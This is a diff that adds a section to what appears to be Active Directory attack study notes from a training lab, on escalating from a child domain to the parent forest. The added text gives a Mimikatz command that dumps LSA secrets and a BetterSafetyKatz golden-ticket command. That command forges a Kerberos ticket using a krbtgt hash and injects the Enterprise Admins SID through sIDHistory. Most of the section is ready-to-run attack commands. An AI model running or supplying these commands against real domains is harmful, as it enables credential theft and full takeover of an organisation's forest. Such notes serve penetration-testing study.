@@ -648,3 +648,23 @@ the domain trust key.
 
 # **Child to Parent (Alternative) - using krbtgt hash**
 
+
+- We will abuse sIDhistory once again
+
+
+```powershell
+Invoke-Mimikatz -Command '"lsadump::lsa /patch"'
+```
+
+
+
+```
+C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden
+/user:Administrator /domain:dollarcorp.moneycorp.local
+/sid:S-1-5-21-719815819-3726368948-3917688648 /sids:S-1-
+5-21-335606122-960912869-3279953914-519
+/krbtgt:4e9815869d2090ccfca61c1fe0d23986 /ptt" "exit"
+```
+
+
+- In the above command, the mimkatz option **"/sids"** is forcefully setting the `sIDHistory` for the Enterprise Admin group for `dollarcorp.moneycorp.local` that is the Forest Enterprise Admin Group.
